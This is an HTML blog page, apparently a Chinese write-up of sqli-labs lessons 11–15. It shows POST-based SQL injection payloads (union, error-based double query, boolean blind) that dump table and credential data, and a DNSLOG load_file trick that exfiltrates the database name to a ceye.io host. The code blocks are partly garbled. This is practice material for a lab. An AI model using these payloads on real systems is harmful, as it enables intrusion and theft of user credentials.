@@ -1,0 +1,155 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>The rest of life</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Learn,"> 
+    <meta name="description" content="Less-16- Blind- Time Based- Double quotes- String1.初步判断uname=admin&amp;amp;passwd=admin&amp;amp;submit=Subm,"> 
+    <meta name="author" content="lI"> 
+    <link rel="alternative" href="atom.xml" title="The rest of life" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+</head>
+
+<body class="loading">
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Less 11-15</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Less 11-15</h1>
+        <div class="stuff">
+            <span>九月 13, 2018</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/post传参/">post传参</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/过滤/">过滤</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Less-11-Error-Based-String"><a href="#Less-11-Error-Based-String" class="headerlink" title="Less-11- Error Based- String"></a><strong>Less-11- Error Based- String</strong></h1><h3 id="1-初步判断"><a href="#1-初步判断" class="headerlink" title="1.初步判断"></a>1.初步判断</h3><p>POST传参在包中写入POST<br><code>uname=admin&amp;passwd=admin&amp;submit=Submit</code><br>正常，有回显<br><code>uname=admin&#39;&amp;passwd=admin&amp;submit=Submit</code><br>报错，有sql报错语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos; LIMIT 0,1&apos; at line 1 ```根据报错判断输入应该是字符串，被两个单引号包裹&apos;$uname&apos;  ### 2.查找注入点 ###` uname=admin&apos; and 1=&apos;1&amp;passwd=admin&amp;submit=Submit `   有返回值，正常返回无报错    ` uname=admin&apos; and 1=&apos;2&amp;passwd=admin&amp;submit=Submit `   无返回值，无sql报错，证明有注入点     ### 3.获取数据 ###``` </span><br><span class="line">uname= &apos; union select database() ,&apos; &apos; --+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//获取当前数据库名uname= &apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;) ,&apos; &apos; --+ &amp;passwd=admin&amp;submit=Submit//获取当前数据库表uname= &apos; union select (select group_concat(username) from security.users) ,&apos; &apos; --+ &amp;passwd=admin&amp;submit=Submit//获取users表username列数据 ```** 小记：字符串 POST传参**# **Less-12- Error Based- Double quotes- String** #### 1.初步判断 ###` uname=admin&amp;passwd=admin&amp;submit=Submit `   正常，有回显  `uname=admin&quot;) &amp;passwd=admin&amp;submit=Submit`   报错，有sql报错语句  ``` </span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;) and password=(&quot;admin&quot;) LIMIT 0,1&apos; at line 1 ```根据sql报错知道是是由双引号和括号包裹的，(&quot;uname&quot;)   ### 2.查找注入点 ###` uname=admin&quot;)and (1=&quot;1 &amp;passwd=admin&amp;submit=Submit `   有返回值，正常返回无报错   ` uname=admin&quot;)and (1=&quot;2 &amp;passwd=admin&amp;submit=Submit `   无返回值且无sql语句报错，证明有注入点   ### 3.获取数据 ###``` </span><br><span class="line">uname=&quot;)union select database() ,(&quot; &quot;) --+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//获取当前数据库名uname=&quot;)union select (select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)  ,(&quot; &quot;) --+&amp;passwd=admin&amp;submit=Submit//获取当前数据库表uname=&quot;)union select (select group_concat(username) from security.users)  ,(&quot; &quot;) --+&amp;passwd=admin&amp;submit=Submit//获取users表username列数据 ```** 小记：字符串 POST传参 括号**# **Less-13- Double Injection- String- with twist** #### 1.初步判断 ###` uname=admin&amp;passwd=admin&amp;submit=Submit `   post传参，无回显，只有一个登陆成功   ` uname=admin&apos;&amp;passwd=admin&amp;submit=Submit `   报错，有sql报错语句   ``` </span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;) LIMIT 0,1&apos; at line 1 ```由sql报错知道参数是由单引号和括号包裹(&apos;uname&apos;)   ### 2.查找注入点 ###` uname=admin&apos;)and (1=&apos;1&amp;passwd=admin&amp;submit=Submit `   正常登陆无报错   ` uname=admin&apos;)and (1=&apos;2&amp;passwd=admin&amp;submit=Submit `   登陆失败无报错，证明有注入点   ### 3.获取数据 ###由于没有回显，所以无法通过回显获得数据，可以通过布尔盲注   ``` </span><br><span class="line">uname=admin&apos;)and length(database())=8 # &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//判断当前库长度</span><br><span class="line">uname=admin&apos;)and mid(database(),1,1)=&apos;s&apos; # &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//判断当前库名</span><br><span class="line">uname=admin&apos;)and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 # &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//判断表名 ```也可以通过数据库写文件的方式将信息写在文本中   ``` </span><br><span class="line">后续补上 ```因为有sql报错返回所以可以用sql报错    ``` </span><br><span class="line">uname= &apos;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &apos;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &apos;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &apos;) union select 1,2 from (select count(*),conca((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &apos;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit ```** 小记：字符串 POST传参 括号 看似限制多解法也多**# **Less-14- Double Injection- Double quotes- String** #### 1.初步判断 ###` uname=admin&amp;passwd=admin&amp;submit=Submit `  正常登陆无报错  ` uname=admin&quot; &amp;passwd=admin&amp;submit=Submit `  报错有sql报错   ``` </span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&quot; LIMIT 0,1&apos; at line 1 ```根据sql报错知道输入值是由双引号包裹&quot;uname&quot;   ### 2.查找注入点 ###` uname=admin&quot; and 1=&quot;1 &amp;passwd=admin&amp;submit=Submit `  正常登陆无报错  ` uname=admin&quot; and 1=&quot;2 &amp;passwd=admin&amp;submit=Submit `  登陆失败无报错，证明有注入点    ### 3.获取数据 ###因为无返回值所以可以用盲注   ``` </span><br><span class="line">uname=admin&quot; and length(database())=8 #&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//判断当前库长度</span><br><span class="line">uname=admin&quot; and (ascii(mid(database(),1,1)))=115  #&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">//判断当前库名</span><br><span class="line">uname=admin&quot; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101  #&amp;passwd=admin&amp;submit=Submit//判断表名 ```因为有sql报错所以可以使用报错法   ``` </span><br><span class="line">uname= &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &quot; union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &quot; union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &quot; union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &quot; union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname= &quot; union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd= &apos;) or 1=1 # &amp;submit=Submit ```** 小记：字符串 POST传参  看似限制多解法也多**# **Less-15- Blind- Boolian Based- String** #### 1.初步判断 ###` uname=admin&amp;passwd=admin&amp;submit=Submit `   正常登陆无报错   因为没有sql报错只有一个登陆或失败的图片所以无法判断包裹只能大概测试闭合   ` uname=admin&apos;--+&amp;passwd=admin `   根据这个post大概判断是由单引号包裹&apos;uname&apos;  ### 2.查找注入点 ###` uname=admin&apos;and 1=&apos;1&amp;passwd=admin `   正常登陆无报错  ` uname=admin&apos;and 1=&apos;2&amp;passwd=admin `   登陆失败，无法确定是否sql语句报错所以，认为是注入点  ### 3.获取数据 ###无sql错误判断所以布尔盲注  ``` </span><br><span class="line">uname=&apos; or (length(database())) = 8 #&amp;passwd=&apos;  #&amp;submit=Submit</span><br><span class="line">//数据库长度</span><br><span class="line">uname=&apos; or (ascii(substr((select database()) ,1,1))) = 115 #&amp;passwd=&apos;  #&amp;submit=Submit//通过ascii码判断数据库名uname=&apos;  or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101#&amp;passwd=&apos;  #&amp;submit=Submit//判断表名 ```另一种取巧方法   利用DNSLOG获取看不到的信息   ` load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;)) `   concat是字符串拼接   database()就是你要做SQL注入查询的地方   &apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名   上面拼接的结果就是&apos;\\\\ schema_name.XXXX.ceye.io\\abc&apos;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了     ``` </span><br><span class="line">uname=admin&apos;  and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.8ojxue.ceye.io.ceye.io\\abc&apos;))),1,1) #&amp;passwd=&apos;  #&amp;submit=Submit</span><br><span class="line">//获取库名</span><br></pre></td></tr></table></figure></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title='0' data-url='http://music.163.com/song/media/outer/url?id=574566207'></li>
+                    
+                        <li title='1' data-url='http://music.163.com/song/media/outer/url?id=494886062'></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11-Error-Based-String"><span class="toc-number">1.</span> <span class="toc-text">Less-11- Error Based- String</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-初步判断"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.初步判断</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
